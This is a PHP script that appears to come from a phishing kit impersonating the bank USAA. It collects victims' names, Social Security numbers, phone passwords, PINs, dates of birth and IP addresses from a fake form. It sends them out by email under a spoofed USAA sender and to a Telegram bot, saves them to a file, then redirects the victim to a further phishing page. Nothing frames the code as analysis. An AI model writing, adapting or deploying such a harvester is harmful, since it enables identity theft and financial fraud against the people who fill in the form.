<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[+]👽 USAA Personal Info 👽[+]\n";
$message .= "First Name : ".$_POST['firstname']."\n";
$message .= "Last Name : ".$_POST['lastName']."\n";
$message .= "SSN : ".$_POST['ssn']."\n";
$message .= "Phone Number : ".$_POST['ph']."\n";
$message .= "Phone Password : ".$_POST['ppass']."\n";
$message .= "Phone Pin : ".$_POST['pin']."\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "Ip              : $ip\n";
$message .= "[+]👽 USAA USER | New Login 👽[+]\n";
$subject = "USAA Personal Info | $ip ";
$headers = "From:USAA <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);


file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: ../info2.php?id=m1yxpjJabdoZaD4OVaGzTZ9vaZafrf49587PTjsbedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");

include 'Telegram.php';

?>